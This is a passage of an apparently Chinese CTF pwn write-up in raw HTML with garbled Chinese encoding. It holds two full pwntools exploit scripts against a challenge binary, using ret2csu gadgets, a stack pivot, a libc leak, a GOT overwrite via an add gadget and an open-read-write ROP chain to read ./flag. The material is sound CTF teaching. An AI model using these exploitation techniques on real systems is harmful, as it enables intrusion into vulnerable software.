string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>   <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./challenge"</span><span class="token comment">#context.log_level="debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'1.yes / 2.no'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>pie<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1249</span>lg<span class="token punctuation">(</span><span class="token string">'pie'</span><span class="token punctuation">,</span>pie<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'æ˜¯ä»€ä¹ˆå‘¢?'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">csuattack</span><span class="token punctuation">(</span>r12<span class="token punctuation">,</span>r13<span class="token punctuation">,</span>r14<span class="token punctuation">,</span>r15<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#def csuattack(edi,rsi,rdx,call[got])</span><span class="token keyword">global</span> csugadget1<span class="token operator">=</span><span class="token number">0x000000000000163A</span><span class="token operator">+</span>piegadget2<span class="token operator">=</span><span class="token number">0x0000000000001620</span><span class="token operator">+</span>piecsu<span class="token operator">=</span>p64<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>csu<span class="token operator">+=</span>p64<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span>csu<span class="token operator">+=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token keyword">return</span> csubss<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x4000</span><span class="token operator">+</span><span class="token number">0x200</span>gets_p<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token operator">+</span>pieclose_g<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">)</span><span class="token operator">+</span>pieread_g<span class="token operator">=</span>eg<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token operator">+</span>pierdi<span class="token operator">=</span><span class="token number">0x0000000000001643</span><span class="token operator">+</span>piersp_ppp<span class="token operator">=</span><span class="token number">0x000000000000163d</span><span class="token operator">+</span>pie<span class="token comment">#-------------edit close_p and stack pivot</span>payload<span class="token operator">=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>csuattack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>close_g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_g<span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">,</span>gets_p<span class="token punctuation">,</span>rsp_ppp<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">b'\x15'</span><span class="token punctuation">)</span><span class="token comment">#-----------leak libc</span>bss<span class="token operator">+=</span><span class="token number">0x200</span>payload<span class="token operator">=</span>csuattack<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>bss<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>read_g<span class="token punctuation">)</span><span class="token comment">#rax=1,write</span>payload<span class="token operator">+=</span>csuattack<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>read_g<span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>close_g<span class="token punctuation">)</span><span class="token comment">#write(2,read_g,0x8)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>bss<span class="token punctuation">,</span>gets_p<span class="token punctuation">,</span>rsp_ppp<span class="token punctuation">,</span>bss<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>uu64<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token comment">#------------orw</span>OPENAT<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'openat'</span><span class="token punctuation">)</span>READ<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>WRITE<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresslg<span class="token punctuation">(</span><span class="token string">'rdi'</span><span class="token punctuation">,</span>rdi<span class="token punctuation">)</span>rsi<span class="token operator">=</span><span class="token number">0x000000000002601f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrdx<span class="token operator">=</span><span class="token number">0x0000000000142c92</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspayload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>OPENAT<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>bss<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>WRITE<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">b'./flag\x00'</span><span class="token comment">#dbg('')</span>sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/3f72d06cdf39249a15265f21eb2b376c_MD5.jpeg"></p><h3 id="EXP2-åˆ©ç”¨magic-gadget"><a href="#EXP2-åˆ©ç”¨magic-gadget" class="headerlink" title="EXP2-åˆ©ç”¨magic_gadget"></a>EXP2-åˆ©ç”¨magic_gadget</h3><p>é¢„æœŸè§£æ˜¯ç”¨ä¸€ä¸ªgadgetï¼Œç›´æ¥åœ¨libcå‡½æ•°ä¸ŠåŠ å‡ï¼Œè¿™æ ·ä¹Ÿèƒ½å®Œæˆåˆ©ç”¨</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0x0000000000001232</span> <span class="token operator">:</span> add dword ptr <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">0x3d</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ebx <span class="token punctuation">;</span> nop dword ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span> <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><div class="caption"><span>TI:"å®˜æ–¹WP"</span></div><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./challenge'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> flag<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./challenge"</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">"--->"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">b': '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1249</span>leak<span class="token punctuation">(</span><span class="token string">"code_base"</span><span class="token punctuation">,</span>code_base<span class="token punctuation">)</span>ret2csu_front <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x1620</span>ret2csu_behind <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x163a</span>magic_gadget <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x1232</span>setbuf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span> <span class="token operator">+</span> code_basepop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000001643</span> <span class="token operator">+</span> code_basepop_rsi <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x0000000000001641</span>ret <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x000000000000101a</span><span class="token comment"># 0x0000000000001232 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret</span><span class="token keyword">def</span> <span class="token function">set_offset</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>    offset <span class="token operator">=</span> target <span class="token operator">-</span> raw    <span class="token keyword">if</span> offset <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        offset <span class="token operator">=</span> offset <span class="token operator">+</span> <span class="token number">0x100000000</span>    <span class="token keyword">return</span> offset<span class="token keyword">def</span> <span class="token function">set_vuln</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        ret2csu_behind<span class="token punctuation">,</span>        offset<span class="token punctuation">,</span>        target<span class="token operator">+</span><span class="token number">0x3d</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        magic_gadget<span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">ret2csu</span><span class="token punctuation">(</span>rdi<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>vuln<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>        ret2csu_behind<span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>        rdi<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>        vuln<span class="token punctuation">,</span>        ret2csu_front<span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> <span class="token number">0x38</span><span class="token operator">*</span><span class="token string">b'a'</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'opendir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>code_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'setbuf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'opendir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> ret2csu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">+</span> code_base<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> set_vuln<span class="token punctuation">(</span>set_offset<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> ret2csu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>code_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span>setbuf_got<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>strings <span class="token operator">=</span> <span class="token string">b"."</span>strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>strings <span class="token operator">+=</span> <span class="token string">b"./flag\x00"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h2><p>æ²¡pie<br><img src="/EXP_FILE/451dd04c63a18604762768c63400b9b7_MD5.jpeg"><br>ã€2.35-0ubuntu3.4ã€‘</p><p>è¯•è¿è¡Œä¸€ä¸‹ï¼Œæ€ä¹ˆåˆæ˜¯ğŸ¤¡<br><img 